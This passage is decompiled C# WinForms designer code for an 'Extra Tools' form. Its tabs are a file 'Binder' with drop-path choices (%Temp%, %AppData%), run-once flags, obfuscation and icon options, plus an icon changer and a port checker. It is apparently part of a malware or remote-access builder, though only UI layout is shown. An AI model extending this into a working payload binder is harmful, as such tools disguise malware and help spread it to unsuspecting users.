		this.Guna2TextBox1.Size = new System.Drawing.Size(357, 21);
		this.Guna2TextBox1.TabIndex = 44;
		this.Label1.AutoSize = true;
		this.Label1.Location = new System.Drawing.Point(47, 80);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(33, 13);
		this.Label1.TabIndex = 0;
		this.Label1.Text = "URL :";
		this.TabPage2.BackColor = System.Drawing.Color.White;
		this.TabPage2.Controls.Add(this.L1);
		this.TabPage2.Controls.Add(this.Guna2Panel2);
		this.TabPage2.ImageKey = "icons8_treere_structure_32.png";
		this.TabPage2.Location = new System.Drawing.Point(4, 34);
		this.TabPage2.Name = "TabPage2";
		this.TabPage2.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage2.Size = new System.Drawing.Size(487, 273);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = "Binder";
		this.L1.AllowDrop = true;
		this.L1.BackColor = System.Drawing.Color.White;
		this.L1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.L1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[4] { this.ColumnHeader1, this.ColumnHeader2, this.ColumnHeader3, this.ColumnHeader4 });
		this.L1.ContextMenuStrip = this.Guna2ContextMenuStrip2;
		this.L1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.L1.Font = new System.Drawing.Font("Tahoma", 8f);
		this.L1.ForeColor = System.Drawing.Color.Black;
		this.L1.FullRowSelect = true;
		this.L1.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
		this.L1.HideSelection = false;
		this.L1.Location = new System.Drawing.Point(3, 3);
		this.L1.Name = "L1";
		this.L1.Size = new System.Drawing.Size(481, 168);
		this.L1.SmallImageList = this.ImageList2;
		this.L1.TabIndex = 33;
		this.L1.UseCompatibleStateImageBehavior = false;
		this.L1.View = System.Windows.Forms.View.Details;
		this.ColumnHeader1.Text = "[ Path ]";
		this.ColumnHeader1.Width = 177;
		this.ColumnHeader2.Text = "[ Size ]";
		this.ColumnHeader2.Width = 78;
		this.ColumnHeader3.Text = "[ Running ]";
		this.ColumnHeader3.Width = 105;
		this.ColumnHeader4.Text = "[ Runonce ]";
		this.ColumnHeader4.Width = 95;
		this.Guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.AddToolStripMenuItem1, this.RemoveToolStripMenuItem1, this.ToolStripMenuItem7, this.RunningToolStripMenuItem, this.RunonceToolStripMenuItem });
		this.Guna2ContextMenuStrip2.Name = "Guna2ContextMenuStrip2";
		this.Guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
		this.Guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
		this.Guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(113, 74, 250);
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.Guna2ContextMenuStrip2.Size = new System.Drawing.Size(136, 114);
		this.AddToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.AddToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("AddToolStripMenuItem1.Image");
		this.AddToolStripMenuItem1.Name = "AddToolStripMenuItem1";
		this.AddToolStripMenuItem1.Size = new System.Drawing.Size(135, 22);
		this.AddToolStripMenuItem1.Text = "[ Add ]";
		this.RemoveToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.RemoveToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RemoveToolStripMenuItem1.Image");
		this.RemoveToolStripMenuItem1.Name = "RemoveToolStripMenuItem1";
		this.RemoveToolStripMenuItem1.Size = new System.Drawing.Size(135, 22);
		this.RemoveToolStripMenuItem1.Text = "[ Remove ]";
		this.ToolStripMenuItem7.BackColor = System.Drawing.Color.White;
		this.ToolStripMenuItem7.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem7.Image");
		this.ToolStripMenuItem7.Name = "ToolStripMenuItem7";
		this.ToolStripMenuItem7.Size = new System.Drawing.Size(135, 22);
		this.ToolStripMenuItem7.Text = "[ Clear ]";
		this.RunningToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.RunningToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.TrueToolStripMenuItem, this.FalseToolStripMenuItem });
		this.RunningToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("RunningToolStripMenuItem.Image");
		this.RunningToolStripMenuItem.Name = "RunningToolStripMenuItem";
		this.RunningToolStripMenuItem.Size = new System.Drawing.Size(135, 22);
		this.RunningToolStripMenuItem.Text = "[ Running ]";
		this.TrueToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.TrueToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("TrueToolStripMenuItem.Image");
		this.TrueToolStripMenuItem.Name = "TrueToolStripMenuItem";
		this.TrueToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
		this.TrueToolStripMenuItem.Text = "[ True ]";
		this.FalseToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.FalseToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("FalseToolStripMenuItem.Image");
		this.FalseToolStripMenuItem.Name = "FalseToolStripMenuItem";
		this.FalseToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
		this.FalseToolStripMenuItem.Text = "[ False ]";
		this.RunonceToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.RunonceToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.TrueToolStripMenuItem1, this.FalseToolStripMenuItem1 });
		this.RunonceToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("RunonceToolStripMenuItem.Image");
		this.RunonceToolStripMenuItem.Name = "RunonceToolStripMenuItem";
		this.RunonceToolStripMenuItem.Size = new System.Drawing.Size(135, 22);
		this.RunonceToolStripMenuItem.Text = "[ Runonce ]";
		this.TrueToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.TrueToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("TrueToolStripMenuItem1.Image");
		this.TrueToolStripMenuItem1.Name = "TrueToolStripMenuItem1";
		this.TrueToolStripMenuItem1.Size = new System.Drawing.Size(114, 22);
		this.TrueToolStripMenuItem1.Text = "[ True ]";
		this.FalseToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.FalseToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("FalseToolStripMenuItem1.Image");
		this.FalseToolStripMenuItem1.Name = "FalseToolStripMenuItem1";
		this.FalseToolStripMenuItem1.Size = new System.Drawing.Size(114, 22);
		this.FalseToolStripMenuItem1.Text = "[ False ]";
		this.ImageList2.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit;
		this.ImageList2.ImageSize = new System.Drawing.Size(20, 20);
		this.ImageList2.TransparentColor = System.Drawing.Color.Transparent;
		this.Guna2Panel2.Controls.Add(this.Guna2CheckBox3);
		this.Guna2Panel2.Controls.Add(this.PictureBox3);
		this.Guna2Panel2.Controls.Add(this.Guna2CheckBox2);
		this.Guna2Panel2.Controls.Add(this.Guna2CheckBox1);
		this.Guna2Panel2.Controls.Add(this.Label7);
		this.Guna2Panel2.Controls.Add(this.Guna2ComboBox2);
		this.Guna2Panel2.Controls.Add(this.Guna2GradientButton5);
		this.Guna2Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Guna2Panel2.Location = new System.Drawing.Point(3, 171);
		this.Guna2Panel2.Name = "Guna2Panel2";
		this.Guna2Panel2.Size = new System.Drawing.Size(481, 99);
		this.Guna2Panel2.TabIndex = 34;
		this.Guna2CheckBox3.AutoSize = true;
		this.Guna2CheckBox3.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox3.CheckedState.BorderRadius = 0;
		this.Guna2CheckBox3.CheckedState.BorderThickness = 0;
		this.Guna2CheckBox3.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox3.Location = new System.Drawing.Point(218, 15);
		this.Guna2CheckBox3.Name = "Guna2CheckBox3";
		this.Guna2CheckBox3.Size = new System.Drawing.Size(80, 17);
		this.Guna2CheckBox3.TabIndex = 58;
		this.Guna2CheckBox3.Text = "Obfuscator";
		this.Guna2CheckBox3.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox3.UncheckedState.BorderRadius = 0;
		this.Guna2CheckBox3.UncheckedState.BorderThickness = 0;
		this.Guna2CheckBox3.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.PictureBox3.BackColor = System.Drawing.Color.White;
		this.PictureBox3.Location = new System.Drawing.Point(434, 15);
		this.PictureBox3.Name = "PictureBox3";
		this.PictureBox3.Size = new System.Drawing.Size(32, 32);
		this.PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.PictureBox3.TabIndex = 57;
		this.PictureBox3.TabStop = false;
		this.Guna2CheckBox2.AutoSize = true;
		this.Guna2CheckBox2.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox2.CheckedState.BorderRadius = 0;
		this.Guna2CheckBox2.CheckedState.BorderThickness = 0;
		this.Guna2CheckBox2.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox2.Location = new System.Drawing.Point(381, 15);
		this.Guna2CheckBox2.Name = "Guna2CheckBox2";
		this.Guna2CheckBox2.Size = new System.Drawing.Size(47, 17);
		this.Guna2CheckBox2.TabIndex = 56;
		this.Guna2CheckBox2.Text = "Icon";
		this.Guna2CheckBox2.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox2.UncheckedState.BorderRadius = 0;
		this.Guna2CheckBox2.UncheckedState.BorderThickness = 0;
		this.Guna2CheckBox2.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox1.AutoSize = true;
		this.Guna2CheckBox1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox1.CheckedState.BorderRadius = 0;
		this.Guna2CheckBox1.CheckedState.BorderThickness = 0;
		this.Guna2CheckBox1.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox1.Location = new System.Drawing.Point(304, 15);
		this.Guna2CheckBox1.Name = "Guna2CheckBox1";
		this.Guna2CheckBox1.Size = new System.Drawing.Size(71, 17);
		this.Guna2CheckBox1.TabIndex = 55;
		this.Guna2CheckBox1.Text = "Assembly";
		this.Guna2CheckBox1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox1.UncheckedState.BorderRadius = 0;
		this.Guna2CheckBox1.UncheckedState.BorderThickness = 0;
		this.Guna2CheckBox1.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Label7.AutoSize = true;
		this.Label7.Location = new System.Drawing.Point(13, 19);
		this.Label7.Name = "Label7";
		this.Label7.Size = new System.Drawing.Size(36, 13);
		this.Label7.TabIndex = 54;
		this.Label7.Text = "Path :";
		this.Guna2ComboBox2.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.BorderRadius = 3;
		this.Guna2ComboBox2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox2.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox2.ItemHeight = 15;
		this.Guna2ComboBox2.Items.AddRange(new object[7] { "%Temp%", "%AppData%", "%Userprofile%", "%Public%", "%ProgramData%", "%LocalAppdata%", "%Current%" });
		this.Guna2ComboBox2.Location = new System.Drawing.Point(55, 15);
		this.Guna2ComboBox2.Name = "Guna2ComboBox2";
		this.Guna2ComboBox2.Size = new System.Drawing.Size(144, 21);
		this.Guna2ComboBox2.TabIndex = 52;
		this.Guna2GradientButton5.BorderRadius = 4;
		this.Guna2GradientButton5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton5.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton5.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton5.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton5.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton5.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton5.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton5.Image");
		this.Guna2GradientButton5.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton5.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton5.Location = new System.Drawing.Point(15, 54);
		this.Guna2GradientButton5.Name = "Guna2GradientButton5";
		this.Guna2GradientButton5.Size = new System.Drawing.Size(451, 34);
		this.Guna2GradientButton5.TabIndex = 51;
		this.Guna2GradientButton5.Text = "Build";
		this.TabPage3.BackColor = System.Drawing.Color.White;
		this.TabPage3.Controls.Add(this.PictureBox2);
		this.TabPage3.Controls.Add(this.Guna2GradientButton3);
		this.TabPage3.Controls.Add(this.Guna2GradientButton6);
		this.TabPage3.Controls.Add(this.Guna2GradientButton4);
		this.TabPage3.Controls.Add(this.Guna2TextBox6);
		this.TabPage3.Controls.Add(this.Label6);
		this.TabPage3.Controls.Add(this.Guna2TextBox5);
		this.TabPage3.Controls.Add(this.Label5);
		this.TabPage3.ImageKey = "icons856_blockchain_new_logo_32.png";
		this.TabPage3.Location = new System.Drawing.Point(4, 34);
		this.TabPage3.Name = "TabPage3";
		this.TabPage3.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage3.Size = new System.Drawing.Size(487, 273);
		this.TabPage3.TabIndex = 2;
		this.TabPage3.Text = "Icon Changer";
		this.PictureBox2.BackColor = System.Drawing.Color.White;
		this.PictureBox2.Location = new System.Drawing.Point(410, 142);
		this.PictureBox2.Name = "PictureBox2";
		this.PictureBox2.Size = new System.Drawing.Size(32, 32);
		this.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.PictureBox2.TabIndex = 63;
		this.PictureBox2.TabStop = false;
		this.Guna2GradientButton3.BorderRadius = 4;
		this.Guna2GradientButton3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton3.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton3.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton3.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton3.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton3.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton3.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton3.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton3.Location = new System.Drawing.Point(410, 86);
		this.Guna2GradientButton3.Name = "Guna2GradientButton3";
		this.Guna2GradientButton3.Size = new System.Drawing.Size(57, 21);
		this.Guna2GradientButton3.TabIndex = 62;
		this.Guna2GradientButton3.Text = "Open";
		this.Guna2GradientButton6.BorderRadius = 4;
		this.Guna2GradientButton6.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton6.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton6.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton6.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton6.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton6.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton6.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton6.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton6.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton6.Image");
		this.Guna2GradientButton6.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton6.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton6.Location = new System.Drawing.Point(64, 140);
		this.Guna2GradientButton6.Name = "Guna2GradientButton6";
		this.Guna2GradientButton6.Size = new System.Drawing.Size(340, 34);
		this.Guna2GradientButton6.TabIndex = 61;
		this.Guna2GradientButton6.Text = "Change";
		this.Guna2GradientButton4.BorderRadius = 4;
		this.Guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton4.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton4.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton4.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton4.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton4.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton4.Location = new System.Drawing.Point(410, 113);
		this.Guna2GradientButton4.Name = "Guna2GradientButton4";
		this.Guna2GradientButton4.Size = new System.Drawing.Size(57, 21);
		this.Guna2GradientButton4.TabIndex = 60;
		this.Guna2GradientButton4.Text = "Open";
		this.Guna2TextBox6.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox6.BorderRadius = 3;
		this.Guna2TextBox6.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox6.DefaultText = "...";
		this.Guna2TextBox6.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox6.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox6.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox6.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox6.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox6.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox6.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox6.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox6.Location = new System.Drawing.Point(64, 113);
		this.Guna2TextBox6.Name = "Guna2TextBox6";
		this.Guna2TextBox6.PasswordChar = '\0';
		this.Guna2TextBox6.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox6.PlaceholderText = "";
		this.Guna2TextBox6.ReadOnly = true;
		this.Guna2TextBox6.SelectedText = "";
		this.Guna2TextBox6.Size = new System.Drawing.Size(340, 21);
		this.Guna2TextBox6.TabIndex = 56;
		this.Label6.AutoSize = true;
		this.Label6.Location = new System.Drawing.Point(20, 116);
		this.Label6.Name = "Label6";
		this.Label6.Size = new System.Drawing.Size(35, 13);
		this.Label6.TabIndex = 55;
		this.Label6.Text = "Icon :";
		this.Guna2TextBox5.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox5.BorderRadius = 3;
		this.Guna2TextBox5.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox5.DefaultText = "...";
		this.Guna2TextBox5.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox5.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox5.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox5.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox5.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox5.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox5.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox5.Location = new System.Drawing.Point(64, 86);
		this.Guna2TextBox5.Name = "Guna2TextBox5";
		this.Guna2TextBox5.PasswordChar = '\0';
		this.Guna2TextBox5.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox5.PlaceholderText = "";
		this.Guna2TextBox5.ReadOnly = true;
		this.Guna2TextBox5.SelectedText = "";
		this.Guna2TextBox5.Size = new System.Drawing.Size(340, 21);
		this.Guna2TextBox5.TabIndex = 54;
		this.Label5.AutoSize = true;
		this.Label5.Location = new System.Drawing.Point(25, 89);
		this.Label5.Name = "Label5";
		this.Label5.Size = new System.Drawing.Size(30, 13);
		this.Label5.TabIndex = 53;
		this.Label5.Text = "File :";
		this.TabPage4.BackColor = System.Drawing.Color.White;
		this.TabPage4.Controls.Add(this.Guna2TextBox4);
		this.TabPage4.Controls.Add(this.Guna2GradientButton2);
		this.TabPage4.Controls.Add(this.Guna2TextBox3);
		this.TabPage4.Controls.Add(this.Label4);
		this.TabPage4.ImageKey = "icons8_glodsfsd2be_32.png";
		this.TabPage4.Location = new System.Drawing.Point(4, 34);
		this.TabPage4.Name = "TabPage4";
		this.TabPage4.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage4.Size = new System.Drawing.Size(487, 273);
		this.TabPage4.TabIndex = 3;
		this.TabPage4.Text = "Check Port";
		this.Guna2TextBox4.BorderColor = System.Drawing.Color.White;
		this.Guna2TextBox4.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox4.DefaultText = "";
		this.Guna2TextBox4.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox4.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox4.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox4.FocusedState.BorderColor = System.Drawing.Color.White;
		this.Guna2TextBox4.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox4.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox4.HoverState.BorderColor = System.Drawing.Color.White;
		this.Guna2TextBox4.Location = new System.Drawing.Point(78, 41);
		this.Guna2TextBox4.Name = "Guna2TextBox4";
		this.Guna2TextBox4.PasswordChar = '\0';
		this.Guna2TextBox4.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox4.PlaceholderText = "";
		this.Guna2TextBox4.ReadOnly = true;
		this.Guna2TextBox4.SelectedText = "";
		this.Guna2TextBox4.Size = new System.Drawing.Size(357, 55);
		this.Guna2TextBox4.TabIndex = 55;
		this.Guna2GradientButton2.BorderRadius = 4;
		this.Guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton2.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton2.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton2.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton2.Image");
		this.Guna2GradientButton2.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton2.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton2.Location = new System.Drawing.Point(78, 129);
		this.Guna2GradientButton2.Name = "Guna2GradientButton2";
		this.Guna2GradientButton2.Size = new System.Drawing.Size(357, 34);
		this.Guna2GradientButton2.TabIndex = 53;
		this.Guna2GradientButton2.Text = "Check";
		this.Guna2TextBox3.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox3.BorderRadius = 3;
		this.Guna2TextBox3.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox3.DefaultText = "";
		this.Guna2TextBox3.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox3.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox3.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox3.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox3.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox3.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox3.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox3.Location = new System.Drawing.Point(78, 102);
		this.Guna2TextBox3.Name = "Guna2TextBox3";
		this.Guna2TextBox3.PasswordChar = '\0';
		this.Guna2TextBox3.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox3.PlaceholderText = "";
		this.Guna2TextBox3.SelectedText = "";
		this.Guna2TextBox3.Size = new System.Drawing.Size(357, 21);
		this.Guna2TextBox3.TabIndex = 52;
		this.Label4.AutoSize = true;
		this.Label4.Location = new System.Drawing.Point(39, 105);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(34, 13);
		this.Label4.TabIndex = 51;
		this.Label4.Text = "Port :";
		this.ImageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("ImageList1.ImageStream");
		this.ImageList1.TransparentColor = System.Drawing.Color.Transparent;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(495, 311);
		base.Controls.Add(this.Guna2TabControl1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "ToolsBox";
		base.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
		this.Text = "Extra Tools";
		this.Guna2TabControl1.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		this.TabPage1.PerformLayout();
		this.TabPage2.ResumeLayout(false);
		this.Guna2ContextMenuStrip2.ResumeLayout(false);
		this.Guna2Panel2.ResumeLayout(false);
		this.Guna2Panel2.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox3).EndInit();
		this.TabPage3.ResumeLayout(false);
		this.TabPage3.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox2).EndInit();
		this.TabPage4.ResumeLayout(false);
		this.TabPage4.PerformLayout();
		base.ResumeLayout(false);
	}

	public ToolsBox()
	{
		base.Load += ToolsBox_Load;
		tcpClient_0 = new TcpClient();
		InitializeComponent();
		this.ImageList1.Images.SetKeyName(0, "icons8_tree_segtructure_32.png");
		this.ImageList1.Images.SetKeyName(1, "icons8_treere_structure_32.png");
		this.ImageList1.Images.SetKeyName(2, "icons856_blockchain_new_logo_32.png");
		this.ImageList1.Images.SetKeyName(3, "icons8_glodsfsd2be_32.png");
		base.Opacity = 0.0;
		Module0.smethod_18(this, 20);
	}

	private void ToolsBox_Load(object sender, EventArgs e)
	{
		Guna2ComboBox1.SelectedIndex = 0;
